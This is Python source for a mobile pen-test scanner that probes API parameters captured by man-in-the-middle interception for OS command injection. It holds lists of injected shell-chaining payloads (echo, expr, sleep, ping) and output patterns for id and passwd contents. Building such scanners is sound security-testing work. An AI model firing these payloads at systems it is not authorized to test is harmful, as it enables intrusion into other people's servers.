"""
Jarwis AGI Pen Test - Mobile Command Injection Scanner

Detects OS Command Injection vulnerabilities in mobile app API traffic.
Extends BaseMobileScanner for MITM-first methodology.

OWASP Mobile Top 10 2024: M4 - Insufficient Input/Output Validation
CWE-78: Improper Neutralization of Special Elements used in an OS Command

Mobile-specific considerations:
- Mobile backends may execute system commands for file processing
- Image processing, PDF generation often vulnerable
- APIs handling file paths are high-risk targets
- Device info/diagnostic endpoints may be vulnerable
"""

import asyncio
import logging
import re
import uuid
from typing import Dict, List, Optional, Any

from attacks.mobile.base_mobile_scanner import (
    BaseMobileScanner,
    MobileFinding,
    Severity,
    Confidence
)
from core.mobile_http_client import MobileHTTPClient, MobileAttackResponse
from core.mobile_request_store import MobileRequestStoreDB, StoredMobileRequest

logger = logging.getLogger(__name__)


class MobileCommandInjectionScanner(BaseMobileScanner):
    """
    OS Command Injection Scanner for Mobile APIs
    
    Scans mobile app traffic for command injection vulnerabilities.
    Uses MITM-captured requests to test injection points.
    
    Attack vectors:
    - Basic command chaining (;, |, &, ||, &&)
    - Blind time-based command injection
    - Command substitution ($(), ``)
    - Newline injection
    """
    
    # Scanner identification
    scanner_name = "mobile_cmdi"
    attack_type = "command_injection"
    vuln_type = "command_injection"
    owasp_category = "M4"  # Insufficient Input/Output Validation
    cwe_id = "CWE-78"
    
    # Unique detection markers
    CANARY_PREFIX = "jarwis"
    MATH_RESULT = "489"  # Result of expr 163 + 326
    
    # Command separators
    SEPARATORS = [';', '|', '||', '&&', '&', '\n', '\r\n', '`']
    
    # Basic command injection payloads (inline detection)
    BASIC_PAYLOADS = [
        # Echo-based detection
        "; echo {canary}",
        "| echo {canary}",
        "|| echo {canary}",
        "&& echo {canary}",
        "& echo {canary}",
        
        # Newline injection
        "%0aecho {canary}",
        "%0d%0aecho {canary}",
        "\necho {canary}",
        
        # Command substitution (Unix)
        "$(echo {canary})",
        "`echo {canary}`",
        
        # Math operations for unique output
        "; expr 163 + 326",
        "| expr 163 + 326",
        "$(expr 163 + 326)",
        
        # Quote escaping
        "'; echo {canary}; '",
        '"; echo {canary}; "',
        "'; echo {canary}; #",
        
        # Common vulnerable patterns
        "127.0.0.1; echo {canary}",
        "test.txt; echo {canary}",
        "1; echo {canary}",
        
        # Windows commands
        "& echo {canary}",
        "| set /p={canary}",
    ]
    
    # Time-based blind payloads
    TIME_PAYLOADS_UNIX = [
        "; sleep {delay}",
        "| sleep {delay}",
        "|| sleep {delay}",
        "&& sleep {delay}",
        "$(sleep {delay})",
        "`sleep {delay}`",
        "'; sleep {delay}; '",
        "%0asleep {delay}",
        "127.0.0.1; sleep {delay}",
        "; ping -c {delay} 127.0.0.1",
    ]
    
    TIME_PAYLOADS_WINDOWS = [
        "& ping -n {delay_plus_1} 127.0.0.1",
        "| ping -n {delay_plus_1} 127.0.0.1",
        "& timeout /t {delay}",
    ]
    
    # Command output patterns
    COMMAND_OUTPUT_PATTERNS = [
        r'uid=\d+',  # id command
        r'Linux|Unix|Darwin',  # uname
        r'root:|nobody:',  # passwd file
        r'\d+\.\d+\.\d+\.\d+',  # IP addresses
        r'/bin/|/usr/',  # Unix paths
        r'Windows|CYGWIN',  # Windows
        r'Directory of',  # Windows dir
    ]
    
    # High-priority parameters for command injection
    PRIORITY_PARAMS = [
        'file', 'filename', 'path', 'filepath', 'dir', 'directory',
        'host', 'hostname', 'ip', 'domain', 'url', 'address',
        'cmd', 'command', 'exec', 'run', 'execute', 'process',
        'convert', 'download', 'upload', 'save', 'output',
        'image', 'pdf', 'doc', 'format', 'type'
    ]
    
    def __init__(
        self,
        http_client: MobileHTTPClient,
        request_store: MobileRequestStoreDB,
        time_delay: float = 5.0,
        oob_server=None,
        **kwargs
    ):
        """
        Initialize Mobile Command Injection Scanner.
        
        Args:
            http_client: Mobile HTTP client for attacks
            request_store: Mobile request store
            time_delay: Seconds for time-based blind detection
            oob_server: Optional OOB callback server for blind detection
        """
        super().__init__(http_client, request_store, **kwargs)
        self.time_delay = time_delay
        self.oob_server = oob_server
        self.canary = f"{self.CANARY_PREFIX}{uuid.uuid4().hex[:8]}"
    
    def get_payloads(self) -> List[str]:
        """Return basic command injection payloads."""
        payloads = [p.format(canary=self.canary) for p in self.BASIC_PAYLOADS]
        return payloads[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredMobileRequest) -> bool:
        """Check if request should be tested for command injection."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters
        if not request.parameters and not request.body:
            return False
        
        # Check for high-priority command injection params
        all_params = list(request.parameters.keys())
        if request.body:
            # Try to extract form/JSON fields
            try:
                import json
                body_data = json.loads(request.body)
                if isinstance(body_data, dict):
                    all_params.extend(body_data.keys())
            except:
                pass
        
        param_names = [p.lower() for p in all_params]
        has_priority_param = any(
            any(prio in name for prio in self.PRIORITY_PARAMS)
            for name in param_names
        )
        
        return has_priority_param or request.endpoint_type == 'dynamic'
    
    async def scan_request(self, request: StoredMobileRequest) -> List[MobileFinding]:
        """
        Scan a request for OS command injection vulnerabilities.
        
        Flow:
        1. Get baseline response
        2. Test each parameter with inline payloads
        3. Test with time-based blind payloads
        4. Check for command output patterns
        """
        findings = []
        
        # Get baseline response
        baseline = await self.get_baseline(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] No baseline for {request.url}")
            return findings
        
        baseline_time_ms = baseline.response_time_ms
        
        # Test query parameters
        for param_name, param_value in request.parameters.items():
            if self._cancelled:
                break
            
            # 1. Inline detection (canary in response)
            inline_finding = await self._test_inline_injection(
                request, param_name, baseline
            )
            if inline_finding:
                findings.append(inline_finding)
                continue
            
            # 2. Time-based blind detection
            time_finding = await self._test_time_based(
                request, param_name, baseline_time_ms
            )
            if time_finding:
                findings.append(time_finding)
        
        # Test body parameters if JSON
        body_finding = await self._test_body_injection(request, baseline)
        if body_finding:
            findings.append(body_finding)
        
        return findings
    
    async def _test_inline_injection(
        self,
        request: StoredMobileRequest,
        param_name: str,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for inline command injection (canary in response)."""
        payloads = self.get_payloads()
        
        for payload in payloads:
            response = await self.send_payload(
                request,
                payload,
                location="query",
                param_name=param_name
            )
            
            if not response:
                continue
            
            # Check for canary in response
            response_text = response.body if isinstance(response.body, str) else str(response.body)
            
            if self.canary in response_text:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    title=f"OS Command Injection in: {param_name}",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to OS command injection. "
                        f"The payload '{payload}' executed successfully and the canary value "
                        f"'{self.canary}' appeared in the response, confirming command execution."
                    ),
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH
                )
            
            # Check for math result
            if self.MATH_RESULT in response_text and 'expr' in payload:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    title=f"OS Command Injection in: {param_name}",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to OS command injection. "
                        f"The arithmetic expression 'expr 163 + 326' was executed and returned "
                        f"the result '{self.MATH_RESULT}' in the response."
                    ),
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH
                )
            
            # Check for command output patterns
            for pattern in self.COMMAND_OUTPUT_PATTERNS:
                if re.search(pattern, response_text):
                    # Only if pattern wasn't in baseline
                    baseline_text = baseline.body if isinstance(baseline.body, str) else str(baseline.body)
                    if not re.search(pattern, baseline_text):
                        return self.create_finding(
                            request=request,
                            response=response,
                            payload=payload,
                            title=f"Possible Command Injection in: {param_name}",
                            description=(
                                f"The parameter '{param_name}' may be vulnerable to command injection. "
                                f"The payload '{payload}' triggered output matching pattern '{pattern}' "
                                "which was not present in the baseline response."
                            ),
                            severity=Severity.HIGH,
                            confidence=Confidence.MEDIUM
                        )
        
        return None
    
    async def _test_time_based(
        self,
        request: StoredMobileRequest,
        param_name: str,
        baseline_time_ms: float
    ) -> Optional[MobileFinding]:
        """Test for time-based blind command injection."""
        delay = int(self.time_delay)
        threshold_ms = baseline_time_ms + (delay * 1000) - 500  # Allow 500ms margin
        
        # Test Unix payloads
        for payload_template in self.TIME_PAYLOADS_UNIX[:5]:  # Limit for performance
            payload = payload_template.format(delay=delay)
            
            response = await self.send_payload(
                request,
                payload,
                location="query",
                param_name=param_name
            )
            
            if not response:
                continue
            
            # Check if response time indicates sleep worked
            if response.response_time_ms >= threshold_ms:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    title=f"Blind Command Injection (Time-based) in: {param_name}",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to blind time-based "
                        f"command injection. The payload '{payload}' caused a delay of "
                        f"~{delay} seconds (response time: {response.response_time_ms:.0f}ms "
                        f"vs baseline: {baseline_time_ms:.0f}ms)."
                    ),
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH
                )
        
        return None
    
    async def _test_body_injection(
        self,
        request: StoredMobileRequest,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test JSON body fields for command injection."""
        if not request.body:
            return None
        
        try:
            import json
            body_data = json.loads(request.body)
            if not isinstance(body_data, dict):
                return None
        except (json.JSONDecodeError, TypeError):
            return None
        
        # Test each string field
        for field_name, field_value in body_data.items():
            if not isinstance(field_value, str):
                continue
            
            # Check if field is a priority target
            if not any(prio in field_name.lower() for prio in self.PRIORITY_PARAMS):
                continue
            
            for payload in self.get_payloads()[:5]:  # Limit payloads
                modified_body = body_data.copy()
                modified_body[field_name] = payload
                
                response = await self.send_payload(
                    request,
                    json.dumps(modified_body),
                    location="body",
                    param_name=field_name
                )
                
                if not response:
                    continue
                
                response_text = response.body if isinstance(response.body, str) else str(response.body)
                
                if self.canary in response_text:
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        title=f"OS Command Injection in JSON field: {field_name}",
                        description=(
                            f"The JSON body field '{field_name}' is vulnerable to command injection. "
                            f"The payload executed and the canary '{self.canary}' appeared in response."
                        ),
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH
                    )
        
        return None
